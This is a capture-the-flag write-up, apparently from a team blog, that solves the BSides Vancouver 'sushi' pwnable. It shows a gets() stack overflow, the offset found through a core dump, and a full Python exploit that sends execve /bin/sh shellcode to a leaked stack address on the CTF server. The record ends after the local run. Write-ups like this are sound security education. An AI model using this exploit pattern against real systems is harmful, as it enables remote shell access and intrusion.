### Solved by barrebas 

At the very last minute, we decided to join BSides Vancouvers' CTF. Sushi was a 100 point pwnable. 

We're given the binary (and the libraries are available if need be -- really nice, no guessing). Upon running it, it gives us some address and asks for money:

```bash
Deposit money for sushi here: 0x7ffc068ccfe0
aaaaaaaa
Sorry, $0.97 is not enough.
```

It seems to take the first character `a` (0x61 or 97) and use that. After fruitlessly trying to trigger a format string vulnerability, I disassembled the binary and checked out it in `gdb-peda`.

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
```

Okay, no protections whatsoever. This means that the stack is executable too. The idea of string format vulnerability was quickly replaced with a good old buffer overflow:

```bash
bas@tritonal:~/tmp/yvrctf/sushi-100$ python -c 'print "".join(["%04d" % x for x in range(200)])' | ./sushi
Deposit money for sushi here: 0x7ffd0aa1edb0
Sorry, $0.48 is not enough.
Segmentation fault (core dumped)
bas@tritonal:~/tmp/yvrctf/sushi-100$ gdb ./sushi core
...snip...
Core was generated by `./sushi'.
Program terminated with signal 11, Segmentation fault.
#0  0x00000000004005f2 in ?? ()

gdb-peda$ x/2wx $rsp
0x7ffd0aa1edf8: 0x38313030  0x39313030
```

Upon supplying a large buffer, the program crashes. Apparently, the saved return address is overwritten with `00180019`, so now I had the offset. The program crashes upon executing the `ret` statement at `0x4005f2` because the address does not point to a valid memory location. 

```bash
bas@tritonal:~/tmp/yvrctf/sushi-100$ python -c 'print "A"*(18*4)+"BBBBCCCC"' | ./sushi
Deposit money for sushi here: 0x7ffdcfd360b0
Sorry, $0.65 is not enough.

0x7ffdcfd360b0:  'A' <repeats 72 times>, "BBBBCCCC"
```

What's more, each time upon running `sushi`, the program supplies the address of the buffer it is using! In other words, that's a nice place for shellcode!

The program uses `gets()` to get the input:

```bash
0x4005c5:  call  0x400480 <gets@plt>
```

This means that we can send null bytes, which we need to overwrite the saved return address with the address of our buffer. These things together (and the fact that the vulnerable binary is ran on a remote box) meant that it had to be run from a `socat` process:

```bash
$ socat TCP-LISTEN:4000,fork,reuseaddr EXEC:./sushi
```

Next was writing a simple exploit in python:

```python
from socket import *
import struct, telnetlib, re

def p(x):
    return struct.pack('<L', x)

def pQ(x):
    return struct.pack('<Q', x)
    
s=socket(AF_INET, SOCK_STREAM)
#s.connect(('localhost', 4000))
s.connect(('sushi.termsec.net', 4000))

buf = s.recv(1000)
stack_addr = int(re.search('(0x[0-9a-f]+)', buf).group(1), 16)

print "[~] stack addr: 0x%lx" % stack_addr

# simple x64 execve shellcode
shellcode = "\x31\xc0\48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
# payload must overflow saved return address on stack
payload = shellcode + "A" * (72 - len(shellcode))
# we're given the address of our (executable!) buffer on the stack, so use that as return address
payload += pQ(stack_addr) + "\n"

s.send(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
```

It ran locally after a bit of fine-tuning, so the proof was in the pudding:

```bash
bas@tritonal:~/tmp/yvrctf/sushi-100$ python ./sushi.py 
[~] stack addr: 0x7fffb3fc0480
Sorry, $0.49 is not enough.
